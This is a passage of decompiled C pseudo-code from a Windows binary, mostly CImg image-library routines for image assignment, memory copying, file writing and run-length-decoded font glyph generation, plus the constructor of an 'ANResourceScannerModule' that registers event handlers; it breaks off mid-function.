_DWORD *__thiscall sub_42B230(_DWORD *this, void *Src, int a3, int a4, int a5, int a6, char a7)
{
  size_t v8; // edi
  void *v9; // eax
  _DWORD v11[14]; // [esp+0h] [ebp-38h] BYREF

  v11[10] = v11;
  v11[9] = this;
  v8 = a6 * a5 * a4 * a3;
  if ( Src && v8 )
  {
    *this = a3;
    this[3] = a6;
    this[1] = a4;
    this[2] = a5;
    *((_BYTE *)this + 16) = a7;
    if ( a7 )
    {
      this[5] = Src;
    }
    else
    {
      v11[13] = 0;
      v9 = (void *)unknown_libname_86(v8);
      this[5] = v9;
      memmove(v9, Src, v8);
    }
  }
  else
  {
    this[3] = 0;
    this[2] = 0;
    this[1] = 0;
    *this = 0;
    *((_BYTE *)this + 16) = 0;
    this[5] = 0;
  }
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (0042B390) --------------------------------------------------------
unsigned int *__thiscall sub_42B390(unsigned int *this, unsigned int a2)
{
  char *v3; // eax
  char *v4; // esi
  unsigned int v5; // ecx
  char *v6; // eax
  char *v7; // esi
  unsigned int v8; // esi
  int v9; // ecx
  unsigned int *v10; // eax
  _DWORD *v11; // eax
  _DWORD *v13; // [esp+18h] [ebp-10h]

  if ( a2 )
  {
    v5 = this[1];
    if ( v5 < a2 || v5 > 4 * a2 )
    {
      v6 = (char *)this[2];
      if ( v6 )
      {
        v7 = v6 - 4;
        `eh vector destructor iterator'(v6, 0x18u, *((_DWORD *)v6 - 1), (void (__thiscall *)(void *))sub_421DE0);
        sub_447DEF(v7);
      }
      v8 = 1;
      if ( a2 <= 1 )
        goto LABEL_12;
      do
        v8 *= 2;
      while ( a2 > v8 );
      if ( v8 <= 0x10 )
LABEL_12:
        v8 = 16;
      this[1] = v8;
      v9 = (24 * (unsigned __int64)v8) >> 32 != 0 ? -1 : 24 * v8;
      v10 = (unsigned int *)unknown_libname_86(__CFADD__(v9, 4) ? -1 : v9 + 4);
      if ( v10 )
      {
        *v10 = v8;
        v13 = v10 + 1;
        `eh vector constructor iterator'(
          v10 + 1,
          0x18u,
          v8,
          (void (__thiscall *)(void *))sub_4223B0,
          (void (__thiscall *)(void *))sub_421DE0);
        v11 = v13;
      }
      else
      {
        v11 = 0;
      }
      this[2] = (unsigned int)v11;
    }
    *this = a2;
  }
  else
  {
    v3 = (char *)this[2];
    if ( v3 )
    {
      v4 = v3 - 4;
      `eh vector destructor iterator'(v3, 0x18u, *((_DWORD *)v3 - 1), (void (__thiscall *)(void *))sub_421DE0);
      sub_447DEF(v4);
    }
    this[1] = 0;
    *this = 0;
    this[2] = 0;
  }
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (0042B4F0) --------------------------------------------------------
void **__thiscall sub_42B4F0(void **this, char *Src, int a3, int a4, int a5, int a6)
{
  int v7; // eax
  size_t v9; // edi
  int v10; // ecx
  void *v12; // [esp-Ch] [ebp-40h]
  _DWORD v13[13]; // [esp+0h] [ebp-34h] BYREF
  void *Srca; // [esp+3Ch] [ebp+8h]

  v13[9] = v13;
  v13[8] = this;
  v7 = a4;
  v9 = a6 * a5 * a4 * a3;
  if ( !Src || !v9 )
  {
    if ( !*((_BYTE *)this + 16) )
      j_j__free(this[5]);
    this[3] = 0;
    this[2] = 0;
    this[1] = 0;
    *this = 0;
    *((_BYTE *)this + 16) = 0;
    this[5] = 0;
    return this;
  }
  v10 = (_DWORD)this[1] * (_DWORD)*this * (_DWORD)this[3] * (_DWORD)this[2];
  if ( Src == this[5] && v9 == v10 )
    return (void **)sub_42A620((int)this, a3, a4, a5, a6);
  if ( *((_BYTE *)this + 16) )
    goto LABEL_11;
  if ( &Src[v9] < this[5] || Src >= (char *)this[5] + v10 )
  {
    v7 = a4;
LABEL_11:
    sub_42A620((int)this, a3, v7, a5, a6);
    v12 = this[5];
    if ( *((_BYTE *)this + 16) )
      memmove_0(v12, Src, v9);
    else
      memmove(v12, Src, v9);
    return this;
  }
  v13[12] = 0;
  Srca = (void *)unknown_libname_86(a6 * a5 * a4 * a3);
  memmove(Srca, Src, v9);
  j_j__free(this[5]);
  this[5] = Srca;
  *this = (void *)a3;
  this[1] = (void *)a4;
  this[2] = (void *)a5;
  this[3] = (void *)a6;
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (0042B6F0) --------------------------------------------------------
_DWORD *__fastcall sub_42B6F0(_DWORD *a1, int *a2)
{
  _DWORD *v3; // ebx
  volatile signed __int32 *v4; // esi
  int v5; // ecx
  _DWORD *result; // eax
  void *v8; // [esp+20h] [ebp-44h] BYREF
  char v9; // [esp+24h] [ebp-40h]
  _DWORD *v10; // [esp+28h] [ebp-3Ch]
  int v11[2]; // [esp+2Ch] [ebp-38h] BYREF
  char v12; // [esp+34h] [ebp-30h]
  _DWORD *v13; // [esp+38h] [ebp-2Ch]
  int *v14; // [esp+50h] [ebp-14h]
  int v15; // [esp+60h] [ebp-4h]

  v3 = operator new(0x4Cu);
  v15 = 0;
  memset(v3, 0, 0x4Cu);
  v4 = (volatile signed __int32 *)a2[1];
  if ( v4 )
  {
    _InterlockedIncrement(v4 + 1);
    v4 = (volatile signed __int32 *)a2[1];
  }
  v5 = *a2;
  LOBYTE(v15) = 1;
  if ( v4 )
    _InterlockedIncrement(v4 + 1);
  sub_40F700(v3, v5, v4, 4);
  *v3 = &ANResourceScannerModule::`vftable';
  _Mtx_init_in_situ((_Mtx_t)(v3 + 7), 2);
  v12 = v9;
  v11[0] = (int)&std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANResourceScannerModule::*)(ANIEvent &&),ANResourceScannerModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';
  v11[1] = (int)sub_419BF0;
  v13 = v3;
  v14 = v11;
  LOBYTE(v15) = 4;
  sub_40FA20(v3, 2, (int)v11);
  v8 = sub_419DF0;
  v10 = v3;
  sub_41A080(v11, (int)&v8);
  sub_40FA20(v3, 3, (int)v11);
  v8 = sub_419E80;
  v10 = v3;
  sub_41A080(v11, (int)&v8);
  sub_40FA20(v3, 30, (int)v11);
  v8 = sub_419EA0;
  v10 = v3;
  sub_41A080(v11, (int)&v8);
  sub_40FA20(v3, 31, (int)v11);
  if ( v14 )
  {
    (*(void (__stdcall **)(bool))(*v14 + 16))(v14 != v11);
    v14 = 0;
  }
  if ( v4 )
  {
    if ( !_InterlockedExchangeAdd(v4 + 1, 0xFFFFFFFF) )
    {
      (**(void (__thiscall ***)(volatile signed __int32 *))v4)(v4);
      if ( !_InterlockedExchangeAdd(v4 + 2, 0xFFFFFFFF) )
        (*(void (__thiscall **)(volatile signed __int32 *))(*v4 + 4))(v4);
    }
  }
  result = a1;
  *a1 = v3;
  return result;
}
// 4B171C: using guessed type void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANResourceScannerModule::*)(ANIEvent &&),ANResourceScannerModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';
// 4B1738: using guessed type void *ANResourceScannerModule::`vftable';

//----- (0042B8A0) --------------------------------------------------------
int *__cdecl sub_42B8A0(int *a1, int a2, int a3, int a4, int a5, int a6, int a7, unsigned int a8, int a9)
{
  int *v9; // eax
  int v10; // ecx
  char *v11; // edi
  int *v12; // eax
  int *v13; // eax
  int v14; // ecx
  int v16; // [esp+0h] [ebp-40h]
  int v17; // [esp+4h] [ebp-3Ch]
  int v18; // [esp+8h] [ebp-38h]
  int v19[4]; // [esp+1Ch] [ebp-24h] BYREF
  char v20; // [esp+2Ch] [ebp-14h]
  void *Block; // [esp+30h] [ebp-10h]
  int v22; // [esp+3Ch] [ebp-4h]

  if ( a8 )
  {
    sub_422290(v19, 2048, v16, v17, v18);
    v22 = 0;
    v9 = sub_41C6E0();
    WaitForSingleObject((HANDLE)v9[6], 0xFFFFFFFF);
    v11 = (char *)Block;
    if ( !v19[0] || sub_41AF60((int *)Block, v19[0], v10, a4, v10, (int)&a9) == -1 )
      sub_41AF90((int)&a9);
    v12 = sub_41C6E0();
    ReleaseMutex((HANDLE)v12[6]);
    v13 = sub_42BE20(a8);
    sub_42D010(a1, a2, a3, v11, a5, a6, a7, (unsigned int *)v13, v14);
    if ( !v20 )
      j_j__free(v11);
  }
  return a1;
}
// 42B8E3: variable 'v16' is possibly undefined
// 42B8E3: variable 'v17' is possibly undefined
// 42B8E3: variable 'v18' is possibly undefined
// 42B912: variable 'v10' is possibly undefined
// 42B961: variable 'v14' is possibly undefined
// 42B8A0: using guessed type int var_24[4];

//----- (0042B990) --------------------------------------------------------
int __thiscall sub_42B990(int this, int *a2, char a3)
{
  int v5; // ecx
  int v6; // edx
  int v7; // ebx
  char *v8; // edi
  int v9; // eax
  char v10; // cl
  int result; // eax
  unsigned int v12; // ecx
  int v13; // [esp+Ch] [ebp-8h]
  int v14; // [esp+10h] [ebp-4h]
  int v15; // [esp+1Ch] [ebp+8h]

  v5 = a2[2];
  v6 = a2[1];
  v7 = a2[3];
  v15 = *a2;
  v8 = (char *)a2[5];
  v13 = v5;
  v14 = v6;
  v9 = v7 * v5 * v6 * v15;
  if ( v8 && v9 )
  {
    v10 = *(_BYTE *)(this + 16);
    if ( a3 )
    {
      if ( !v10 )
      {
        v12 = *(_DWORD *)(this + 20);
        if ( (unsigned int)&v8[v9] < v12
          || (unsigned int)v8 >= v12
                               + *(_DWORD *)(this + 12)
                               * *(_DWORD *)(this + 8)
                               * *(_DWORD *)(this + 4)
                               * *(_DWORD *)this )
        {
          j_j__free(*(void **)(this + 20));
        }
        else
        {
          sub_41C800(
            (int)"[instance(%u,%u,%u,%u,%p,%sshared)] CImg<%s>::assign(): Shared image instance has overlapping memory.",
            *(_DWORD *)this);
        }
        v6 = v14;
      }
      *(_DWORD *)this = v15;
      *(_DWORD *)(this + 20) = v8;
      *(_DWORD *)(this + 8) = v13;
      result = this;
      *(_DWORD *)(this + 12) = v7;
      *(_DWORD *)(this + 4) = v6;
      *(_BYTE *)(this + 16) = 1;
    }
    else
    {
      if ( v10 )
      {
        *(_DWORD *)(this + 12) = 0;
        *(_DWORD *)(this + 8) = 0;
        *(_DWORD *)(this + 4) = 0;
        *(_DWORD *)this = 0;
        *(_BYTE *)(this + 16) = 0;
        *(_DWORD *)(this + 20) = 0;
      }
      sub_4235A0((void **)this, v8, v15, v6, v13, v7);
      return this;
    }
  }
  else
  {
    if ( !*(_BYTE *)(this + 16) )
      j_j__free(*(void **)(this + 20));
    *(_DWORD *)(this + 12) = 0;
    result = this;
    *(_DWORD *)(this + 8) = 0;
    *(_DWORD *)(this + 4) = 0;
    *(_DWORD *)this = 0;
    *(_BYTE *)(this + 16) = 0;
    *(_DWORD *)(this + 20) = 0;
  }
  return result;
}

//----- (0042BAE0) --------------------------------------------------------
int __fastcall sub_42BAE0(int a1, unsigned int a2, FILE *Stream)
{
  FILE *v3; // eax
  unsigned int v5; // edi
  int v6; // ebx
  size_t v7; // esi
  size_t v8; // eax
  int v9; // edx
  int v10; // [esp+10h] [ebp-18h]
  char pExceptionObject[16]; // [esp+18h] [ebp-10h] BYREF

  v3 = Stream;
  v10 = a1;
  if ( !a1 || !Stream )
  {
    sub_41C6D0();
    sub_41C2D0(
      (int)pExceptionObject,
      (int)"cimg::fwrite(): Invalid writing request of %u %s%s from buffer %p to file %p.",
      v9);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AUCImgArgumentException_cimg_library__);
  }
  if ( !a2 )
    return 0;
  v5 = a2;
  v6 = 0;
  while ( 1 )
  {
    v7 = 66060288;
    if ( v5 < 0x3F00000 )
      v7 = v5;
    v8 = fwrite((const void *)(v6 + a1), 1u, v7, v3);
    v6 += v8;
    v5 -= v8;
    if ( v7 != v8 )
      break;
    v3 = Stream;
    a1 = v10;
    if ( !v5 )
      return v6;
  }
  if ( v5 )
    sub_41C800((int)"cimg::fwrite(): Only %lu/%lu elements could be written in file.", v6);
  return v6;
}
// 42BB89: variable 'v9' is possibly undefined

//----- (0042BBB0) --------------------------------------------------------
double *__fastcall sub_42BBB0(double *a1, double *a2)
{
  if ( *a1 > *a2 )
    return a2;
  return a1;
}

//----- (0042BBC0) --------------------------------------------------------
unsigned int __fastcall sub_42BBC0(unsigned int *a1, unsigned int *a2, unsigned int *a3, unsigned int *a4)
{
  unsigned int *v4; // esi
  unsigned int v5; // edi

  v4 = a4;
  v5 = *a2;
  if ( *a1 >= *a2 )
    v5 = *a1;
  if ( *a3 >= *a4 )
    v4 = a3;
  if ( v5 < *v4 )
    return *v4;
  return v5;
}

//----- (0042BBF0) --------------------------------------------------------
_DWORD *__thiscall sub_42BBF0(void *this, int a2)
{
  float *v3; // ebx
  int v4; // ecx
  int v5; // edx
  _DWORD *v6; // edi
  _BYTE *v7; // ecx
  _BYTE *i; // edx
  int v9; // eax
  _DWORD *result; // eax

  v3 = (float *)*((_DWORD *)this + 5);
  if ( v3
    && (v4 = *(_DWORD *)this,
        v5 = *((_DWORD *)this + 1),
        *((_DWORD *)this + 3) * *((_DWORD *)this + 2) * v5 * *(_DWORD *)this) )
  {
    v6 = (_DWORD *)a2;
    sub_42A620(a2, v4, v5, *((_DWORD *)this + 2), *((_DWORD *)this + 3));
    v7 = *(_BYTE **)(a2 + 20);
    for ( i = &v7[*v6 * v6[1] * v6[2] * v6[3]]; v7 < i; ++v7 )
    {
      v9 = (int)*v3++;
      *v7 = v9;
    }
  }
  else
  {
    v6 = (_DWORD *)a2;
    if ( !*(_BYTE *)(a2 + 16) )
      j_j__free(*(void **)(a2 + 20));
    *(_DWORD *)(a2 + 12) = 0;
    *(_DWORD *)(a2 + 8) = 0;
    *(_DWORD *)(a2 + 4) = 0;
    *(_DWORD *)a2 = 0;
    *(_BYTE *)(a2 + 16) = 0;
    *(_DWORD *)(a2 + 20) = 0;
  }
  if ( !*((_BYTE *)this + 16) )
    j_j__free(*((void **)this + 5));
  result = v6;
  *((_DWORD *)this + 3) = 0;
  *((_DWORD *)this + 2) = 0;
  *((_DWORD *)this + 1) = 0;
  *(_DWORD *)this = 0;
  *((_BYTE *)this + 16) = 0;
  *((_DWORD *)this + 5) = 0;
  return result;
}

//----- (0042BCD0) --------------------------------------------------------
int __thiscall sub_42BCD0(int this, int *a2, char a3)
{
  int v5; // ecx
  int v6; // edx
  int v7; // ebx
  char *v8; // edi
  int v9; // eax
  char v10; // cl
  int result; // eax
  unsigned int v12; // ecx
  int v13; // [esp+Ch] [ebp-8h]
  int v14; // [esp+10h] [ebp-4h]
  int v15; // [esp+1Ch] [ebp+8h]

  v5 = a2[2];
  v6 = a2[1];
  v7 = a2[3];
  v15 = *a2;
  v8 = (char *)a2[5];
  v13 = v5;
  v14 = v6;
  v9 = v7 * v5 * v6 * v15;
  if ( v8 && v9 )
  {
    v10 = *(_BYTE *)(this + 16);
    if ( a3 )
    {
      if ( !v10 )
      {
        v12 = *(_DWORD *)(this + 20);
        if ( (unsigned int)&v8[v9] < v12
          || (unsigned int)v8 >= v12
                               + *(_DWORD *)(this + 12)
                               * *(_DWORD *)(this + 8)
                               * *(_DWORD *)(this + 4)
                               * *(_DWORD *)this )
        {
          j_j__free(*(void **)(this + 20));
        }
        else
        {
          sub_41C800(
            (int)"[instance(%u,%u,%u,%u,%p,%sshared)] CImg<%s>::assign(): Shared image instance has overlapping memory.",
            *(_DWORD *)this);
        }
        v6 = v14;
      }
      *(_DWORD *)this = v15;
      *(_DWORD *)(this + 20) = v8;
      *(_DWORD *)(this + 8) = v13;
      result = this;
      *(_DWORD *)(this + 12) = v7;
      *(_DWORD *)(this + 4) = v6;
      *(_BYTE *)(this + 16) = 1;
    }
    else
    {
      if ( v10 )
      {
        *(_DWORD *)(this + 12) = 0;
        *(_DWORD *)(this + 8) = 0;
        *(_DWORD *)(this + 4) = 0;
        *(_DWORD *)this = 0;
        *(_BYTE *)(this + 16) = 0;
        *(_DWORD *)(this + 20) = 0;
      }
      sub_42B4F0((void **)this, v8, v15, v6, v13, v7);
      return this;
    }
  }
  else
  {
    if ( !*(_BYTE *)(this + 16) )
      j_j__free(*(void **)(this + 20));
    *(_DWORD *)(this + 12) = 0;
    result = this;
    *(_DWORD *)(this + 8) = 0;
    *(_DWORD *)(this + 4) = 0;
    *(_DWORD *)this = 0;
    *(_BYTE *)(this + 16) = 0;
    *(_DWORD *)(this + 20) = 0;
  }
  return result;
}

//----- (0042BE20) --------------------------------------------------------
int *__fastcall sub_42BE20(unsigned int a1)
{
  unsigned int v1; // edi
  int *v3; // eax
  int v4; // ebx
  bool v5; // zf
  int *v6; // esi
  int v7; // ecx
  int v8; // edx
  char *v9; // edi
  int v10; // edx
  int v11; // edx
  char *v12; // esi
  unsigned int v13; // edx
  unsigned int v14; // eax
  unsigned int i; // edi
  char **v16; // eax
  int v17; // ecx
  char v18; // al
  unsigned int v19; // ebx
  int v20; // ecx
  size_t v21; // eax
  int v22; // ecx
  int v23; // ecx
  int v24; // eax
  int v25; // ecx
  size_t v26; // eax
  int v27; // ecx
  int v28; // ecx
  char *v29; // ebx
  int v30; // eax
  void **v31; // ecx
  char *v32; // esi
  int v33; // esi
  unsigned int *v34; // ebx
  int *v35; // ecx
  unsigned int *v36; // eax
  int v37; // ecx
  char *v38; // esi
  int v39; // edi
  int v40; // ebx
  int v41; // eax
  int v42; // ecx
  int v43; // esi
  unsigned int v44; // eax
  int v45; // edx
  int v46; // eax
  _BYTE *v47; // ecx
  _BYTE *j; // edx
  signed int v49; // ecx
  char *v50; // edx
  int v51; // edi
  int *v52; // eax
  int v53; // edx
  int v54; // esi
  int v55; // ebx
  int v56; // ecx
  int v57; // ebx
  int v58; // eax
  int *v59; // esi
  _DWORD *v60; // eax
  int v61; // esi
  int v62; // ecx
  int v63; // eax
  signed int v64; // edi
  int v65; // esi
  int v66; // eax
  unsigned int v67; // edx
  int v68; // ecx
  unsigned int v69; // eax
  unsigned int k; // esi
  int v71; // eax
  int v72; // esi
  int *v73; // eax
  void *v74; // ebx
  int v75; // ecx
  int v76; // edx
  int v77; // edi
  int v78; // eax
  int *v79; // eax
  int v80; // [esp-14h] [ebp-94h]
  int v81; // [esp+0h] [ebp-80h]
  int v82; // [esp+4h] [ebp-7Ch]
  int v83; // [esp+8h] [ebp-78h]
  int v84; // [esp+Ch] [ebp-74h]
  int v85; // [esp+20h] [ebp-60h]
  int v86; // [esp+24h] [ebp-5Ch] BYREF
  int v87; // [esp+28h] [ebp-58h]
  int v88; // [esp+2Ch] [ebp-54h]
  int v89; // [esp+30h] [ebp-50h]
  char v90; // [esp+34h] [ebp-4Ch]
  void *Block; // [esp+38h] [ebp-48h]
  char *v92; // [esp+3Ch] [ebp-44h]
  int *v93; // [esp+40h] [ebp-40h]
  int *v94; // [esp+44h] [ebp-3Ch]
  unsigned int *v95; // [esp+48h] [ebp-38h]
  unsigned int v96; // [esp+4Ch] [ebp-34h]
  int v97; // [esp+50h] [ebp-30h]
  int v98; // [esp+54h] [ebp-2Ch]
  int v99[3]; // [esp+58h] [ebp-28h] BYREF
  unsigned int v100; // [esp+64h] [ebp-1Ch] BYREF
  char v101; // [esp+68h] [ebp-18h]
  void *v102; // [esp+6Ch] [ebp-14h]
  int v103; // [esp+7Ch] [ebp-4h]

  v1 = a1;
  v96 = a1;
  if ( a1 )
  {
    v3 = sub_41C6E0();
    WaitForSingleObject((HANDLE)v3[11], 0xFFFFFFFF);
    v93 = *(int **)NtCurrentTeb()->ThreadLocalStoragePointer;
    if ( dword_500A78 > v93[1] )
    {
      _Init_thread_header(&dword_500A78);
      if ( dword_500A78 == -1 )
      {
        `eh vector constructor iterator'(
          &unk_500AF8,
          0x18u,
          4u,
          (void (__thiscall *)(void *))sub_4223B0,
          (void (__thiscall *)(void *))sub_421DE0);
        atexit(sub_48DBE0);
        v103 = -1;
        _Init_thread_footer(&dword_500A78);
      }
    }
    if ( v1 > 0xD )
    {
      if ( v1 > 0x20 )
        v4 = (v1 > 0x40) + 2;
      else
        v4 = 1;
    }
    else
    {
      v4 = 0;
    }
    v5 = dword_500B0C[6 * v4] == 0;
    v6 = (int *)((char *)&unk_500AF8 + 24 * v4);
    v94 = v6;
    if ( !v5 )
      goto LABEL_45;
    sub_42A620((int)&unk_500AF8 + 24 * v4, dword_4B19AC[v4] << 8, dword_4B18E0[v4], 1, 1);
    v8 = v6[2] * v6[3];
    v9 = (char *)v6[5];
    v92 = v9;
    memset(v99, 0, sizeof(v99));
    v10 = v6[1] * v8;
    v100 = 0;
    v101 = 0;
    v11 = *v6 * v10;
    v12 = 0;
    v102 = 0;
    v13 = (unsigned int)&v9[v11];
    v97 = v13;
    v103 = 1;
    v14 = dword_4B19F4[v4];
    if ( v14 )
    {
      for ( i = 0; i < v14; ++i )
      {
        v98 = v14 - 1;
        v16 = off_4B17B4[v4];
        if ( v16[i] )
        {
          sub_422230(&v86, (int)v16[i], strlen(v16[i]) + (i == v98), v81, v82, v83, v84);
        }
        else
        {
          v86 = 0;
          v87 = 0;
          v88 = 0;
          v89 = 0;
          v90 = 0;
          Block = 0;
        }
        LOBYTE(v103) = 2;
        sub_42CA50((int)v99, 0.0, &v86, v7);
        LOBYTE(v103) = 1;
        if ( !v90 )
          j_j__free(Block);
        v14 = dword_4B19F4[v4];
      }
      v12 = (char *)v102;
      v9 = v92;
      v13 = v97;
    }
    v5 = byte_4B1908[v4] == 0;
    v17 = dword_4B1940[v4];
    v18 = *v12;
    v95 = (unsigned int *)v17;
    if ( v5 )
    {
      if ( v18 )
      {
        while ( 1 )
        {
          v23 = v18 - (_DWORD)v95;
          v98 = (int)v12;
          v24 = v23 - 32;
          if ( v23 - 32 < 0 )
          {
            v27 = *++v12;
            v26 = -v24;
            v28 = v27 - (_DWORD)v95 - 32;
            if ( v28 >= 0 )
            {
              v25 = 85 * v28;
            }
            else
            {
              v12 = (char *)v98;
              v25 = 0;
            }
          }
          else
          {
            v25 = 85 * (v23 - 32);
            v26 = 1;
          }
          v29 = &v9[v26];
          if ( (unsigned int)&v9[v26] > v13 )
            break;
          memset(v9, v25, v26);
          v18 = *++v12;
          v13 = v97;
          v9 = v29;
          if ( !v18 )
            goto LABEL_41;
        }
        memset(v9, v25, v13 - (_DWORD)v9);
        goto LABEL_41;
      }
    }
    else if ( v18 )
    {
      v19 = v97;
      while ( 1 )
      {
        v20 = v18 - v17 - 32;
        v21 = abs32(v20);
        v22 = ((v20 >> 31) & 0xFFFFFF01) + 255;
        v98 = (int)&v9[v21];
        if ( (unsigned int)&v9[v21] > v19 )
          break;
        memset(v9, v22, v21);
        v18 = *++v12;
        v9 = (char *)v98;
        v17 = (int)v95;
        if ( !v18 )
          goto LABEL_41;
      }
      memset(v9, v22, v19 - (_DWORD)v9);
LABEL_41:
      v12 = (char *)v102;
    }
    v103 = -1;
    if ( !v101 )
      j_j__free(v12);
    v1 = v96;
LABEL_45:
    if ( dword_500B58 > v93[1] )
    {
      _Init_thread_header(&dword_500B58);
      if ( dword_500B58 == -1 )
      {
        v103 = 3;
        `eh vector constructor iterator'(
          dword_500B60,
          0xCu,
          0x10u,
          (void (__thiscall *)(void *))sub_423CB0,
          (void (__thiscall *)(void *))sub_421C40);
        atexit(sub_48DBC0);
        v103 = -1;
        _Init_thread_footer(&dword_500B58);
      }
    }
    v30 = 0;
    v31 = &dword_500B68;
    while ( *v31 && (byte_5009C4[v30] != 1 || v1 != *((_DWORD *)*v31 + 1)) )
    {
      v31 += 3;
      ++v30;
      if ( (int)v31 >= (int)&dword_500C28 )
        goto LABEL_55;
    }
    if ( v30 != -1 )
      goto LABEL_58;
LABEL_55:
    if ( dword_500B68 )
    {
      v32 = (char *)dword_500B68 - 4;
      v103 = 4;
      `eh vector destructor iterator'(
        dword_500B68,
        0x18u,
        *((_DWORD *)dword_500B68 - 1),
        (void (__thiscall *)(void *))sub_421DE0);
      sub_447DEF(v32);
      v103 = -1;
    }
    dword_500B64 = 0;
    dword_500B60[0] = 0;
    dword_500B68 = 0;
    memmove_0(dword_500B60, &unk_500B6C, 0xB4u);
    memmove_0(byte_5009C4, &unk_5009C5, 0xFu);
    dword_500C1C = 0;
    qword_500C14 = 0i64;
    v30 = 15;
LABEL_58:
    v33 = 12 * v30;
    v97 = 12 * v30;
    v5 = *(&dword_500B68 + 3 * v30) == 0;
    v34 = (unsigned int *)&dword_500B60[3 * v30];
    v95 = v34;
    if ( !v5 )
      goto LABEL_114;
    if ( v1 > 0x40 )
      v98 = (v1 > 0x80) + 2;
    else
      v98 = 1;
    v35 = v94;
    byte_5009C4[v30] = 1;
    v36 = sub_42AD00(v35, &v100, 120, 256);
    v103 = 5;
    sub_42CCA0(v34, v36, v37);
    v103 = -1;
    if ( v102 )
    {
      v38 = (char *)v102 - 4;
      v103 = 6;
      `eh vector destructor iterator'(v102, 0x18u, *((_DWORD *)v102 - 1), (void (__thiscall *)(void *))sub_421DE0);
      sub_447DEF(v38);
      v33 = v97;
      v103 = -1;
    }
    if ( v1 != (*(_DWORD **)((char *)&dword_500B68 + v33))[1] )
    {
      v39 = 0;
      if ( (int)*v34 > 0 )
      {
        v40 = 0;
        do
        {
          v41 = *(int *)((char *)&dword_500B68 + v33);
          v42 = v40 + v41;
          v43 = v96 < *(_DWORD *)(v41 + 4) ? 2 : 5;
          v44 = v96 * *(_DWORD *)(v40 + v41) / *(_DWORD *)(v40 + v41 + 4);
          v45 = 1;
          if ( v44 > 1 )
            v45 = v44;
          sub_423CD0(v42, v45, v96, -100, -100, v43, 0, 0i64, 0.0, 0.0);
          v33 = v97;
          v46 = *(int *)((char *)&dword_500B68 + v97);
          v47 = *(_BYTE **)(v40 + v46 + 20);
          for ( j = &v47[*(_DWORD *)(v40 + v46)
                       * *(_DWORD *)(v40 + v46 + 4)
                       * *(_DWORD *)(v40 + v46 + 8)
                       * *(_DWORD *)(v40 + v46 + 12)]; v47 < j; ++v47 )
            *v47 = byte_4B17E0[(unsigned __int8)*v47];
          ++v39;
          v40 += 24;
        }
        while ( v39 < *(int *)((char *)dword_500B60 + v33) );
        v34 = v95;
      }
    }
    v49 = 0;
    v96 = 0;
    if ( (int)*v34 > 0 )
    {
      v50 = 0;
      v92 = 0;
      do
      {
        v51 = 0;
        v52 = (int *)(*(char **)((char *)&dword_500B68 + v33) + (_DWORD)v50);
        v93 = v52;
        v53 = *v52;
        v54 = *v52;
        if ( v52[1] > 0 )
        {
          v55 = 0;
          v85 = 0;
          v94 = (int *)v52[1];
          do
          {
            v56 = 0;
            if ( v53 > 0 )
            {
              v57 = v52[5] + v55;
              do
              {
                if ( *(_BYTE *)(v57 + v56) )
                {
                  v58 = v56;
                  if ( v56 >= v54 )
                    v58 = v54;
                  v54 = v58;
                  if ( v56 > v51 )
                    v51 = v56;
                }
                ++v56;
              }
              while ( v56 < v53 );
              v55 = v85;
              v52 = v93;
            }
            v55 += v53;
            v5 = v94 == (int *)1;
            v94 = (int *)((char *)v94 - 1);
            v85 = v55;
          }
          while ( !v5 );
          v34 = v95;
          v49 = v96;
        }
        if ( v54 <= v51 )
        {
          v80 = v54;
          v59 = v93;
          v60 = sub_42AF90(v93, &v86, v80, 0, 0, 0, v51, v52[1] - 1, v52[2] - 1, v52[3] - 1, v52[3] - 1);
          v103 = 7;
          sub_423F60((int)v60, (int)v59);
          v103 = -1;
          if ( !v90 )
            j_j__free(Block);
          v49 = v96;
        }
        ++v49;
        v33 = v97;
        v50 = v92 + 24;
        v96 = v49;
        v92 += 24;
      }
      while ( v49 < (int)*v34 );
    }
    v61 = v97;
    sub_423CD0(
      *(int *)((char *)&dword_500B68 + v97) + 768,
      (*(_DWORD **)((char *)&dword_500B68 + v97))[612],
      -100,
      -100,
      -100,
      0,
      0,
      0i64,
      0.0,
      0.0);
    v63 = *v34;
    if ( *v34 > 0x120 )
    {
      sub_423CD0(
        *(int *)((char *)&dword_500B68 + v61) + 6912,
        (*(_DWORD **)((char *)&dword_500B68 + v61))[612],
        -100,
        -100,
        -100,
        0,
        0,
        0i64,
        0.0,
        0.0);
      v63 = *v34;
    }
    v64 = 0;
    if ( v63 > 0 )
    {
      v65 = 0;
      do
      {
        v66 = *(int *)((char *)&dword_500B68 + v97);
        v67 = *(_DWORD *)(v66 + v65);
        v68 = v66 + v65;
        v69 = *(_DWORD *)(v66 + 1416);
        if ( v69 >= v67 )
          v67 = v69;
        sub_423CD0(v68, v98 + v67, -100, 1, 1, 0, 0, 1057803469i64, 0.0, 0.0);
        ++v64;
        v65 += 24;
      }
      while ( v64 < (int)*v34 );
    }
    v86 = 0;
    v87 = 0;
    v88 = 0;
    v89 = 0;
    v90 = 0;
    Block = 0;
    v103 = 8;
    for ( k = 0; k < 0x100; ++k )
      sub_42C7B0(v34, (int)&v86, k, v62);
    v103 = -1;
    j_j__free(0);
    if ( *v34 <= 0xFF )
    {
      v71 = *v34 - 1;
      if ( v71 < 0 )
      {
LABEL_114:
        v79 = sub_41C6E0();
        ReleaseMutex((HANDLE)v79[11]);
        return (int *)v34;
      }
    }
    else
    {
      v71 = 255;
    }
    v72 = 0;
    v98 = v71 + 1;
    do
    {
      v73 = (int *)sub_42A620(
                     *(int *)((char *)&dword_500B68 + v97) + v72,
                     *(_DWORD *)(*(char **)((char *)&dword_500B68 + v97) + v72 + 6144),
                     *(_DWORD *)(*(char **)((char *)&dword_500B68 + v97) + v72 + 6148),
                     1,
                     3);
      v74 = (void *)v73[5];
      if ( v74 )
      {
        v75 = *v73;
        if ( *v73 )
        {
          v76 = v73[1];
          if ( v76 )
          {
            v77 = v73[2];
            if ( v77 )
            {
              v78 = v73[3];
              if ( v78 )
                memset(v74, 1, v75 * v76 * v77 * v78);
            }
          }
        }
      }
      v72 += 24;
      --v98;
    }
    while ( v98 );
    v34 = v95;
